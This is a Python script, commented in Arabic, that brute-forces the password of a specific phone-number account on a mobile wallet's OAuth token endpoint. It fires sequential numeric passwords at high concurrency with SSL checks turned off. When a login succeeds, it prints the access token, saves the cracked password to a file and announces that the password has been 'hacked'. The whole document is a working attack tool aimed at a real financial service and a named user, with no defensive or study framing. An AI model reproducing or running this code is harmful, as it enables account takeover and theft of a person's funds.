import asyncio
import aiohttp
import time
import warnings

# إلغاء تحذيرات SSL لتنظيف الشاشة
warnings.filterwarnings("ignore")

# 🔹 الإعدادات الأساسية
BASE_URL = "https://app.jawali-ye.com.ye:8473/walletmobileproxy/"
FULL_URL = BASE_URL + "oauth/token"

BASE_DATA = {
    "grant_type": "password",
    "client_id": "restapp",
    "client_secret": "restapp",
    "username": "777893643",
    "scope": "openid"
}

# 🔹 إعدادات السرعة (يمكنك تعديلها)
CONCURRENCY_LIMIT = 50  # عدد الطلبات التي سيتم إرسالها معاً في نفس اللحظة
CHUNK_SIZE = 1000       # عدد المحاولات في كل دفعة

async def attempt_login(session, password, semaphore, stop_event):
    """دالة فحص كلمة مرور واحدة"""
    # إذا تم إيجاد الباسورد بواسطة مهمة أخرى، نوقف العمل فوراً
    if stop_event.is_set():
        return None

    async with semaphore:
        data = BASE_DATA.copy()
        data["password"] = str(password)
        try:
            # إرسال الطلب بدون فحص SSL لتسريع العملية
            async with session.post(FULL_URL, data=data, ssl=False, timeout=10) as response:
                if response.status == 200:
                    json_resp = await response.json()
                    stop_event.set() # إعطاء إشارة لباقي الطلبات بالتوقف
                    return password, json_resp
        except Exception:
            # تجاهل أخطاء الاتصال لتجنب إيقاف البوت
            pass
    return None

async def main():
    print("🚀 بدء التشغيل السريع...")
    start_time = time.time()
    
    # تحديد الحد الأقصى للطلبات المتزامنة
    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    stop_event = asyncio.Event()
    
    # استخدام TCPConnector لفتح اتصال دائم (Keep-Alive)
    connector = aiohttp.TCPConnector(ssl=False, limit=CONCURRENCY_LIMIT)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        current_pass = 0
        
        while not stop_event.is_set():
            print(f"🔄 جاري فحص الدفعة من {current_pass} إلى {current_pass + CHUNK_SIZE - 1}...")
            
            tasks = []
            for p in range(current_pass, current_pass + CHUNK_SIZE):
                tasks.append(attempt_login(session, p, semaphore, stop_event))
            
            # تنفيذ الدفعة كاملة بشكل متزامن
            results = await asyncio.gather(*tasks)
            
            # فحص إذا نجحت إحدى المحاولات
            for res in results:
                if res:
                    password, data = res
                    print("\n" + "="*40)
                    print(f"✅ نجاح مذهل! تم اختراق كلمة المرور: {password}")
                    print(f"🔑 التوكن: {data.get('access_token')}")
                    print(f"⏱️ الوقت المستغرق: {time.time() - start_time:.2f} ثانية")
                    print("="*40)
                    
                    # ───[ إضافة حفظ الباسورد في ملف sh.txt ]───
                    try:
                        with open("sh.txt", "w") as f:
                            f.write(str(password))
                        print("📁 تم حفظ كلمة المرور بنجاح في ملف sh.txt")
                    except Exception as e:
                        print(f"⚠️ حدث خطأ أثناء محاولة حفظ الملف: {e}")
                    # ─────────────────────────────────────────
                    return
            
            current_pass += CHUNK_SIZE

    print("❌ انتهت المحاولات دون نجاح.")

if __name__ == "__main__":
    # تشغيل حلقة الـ Async
    asyncio.run(main())
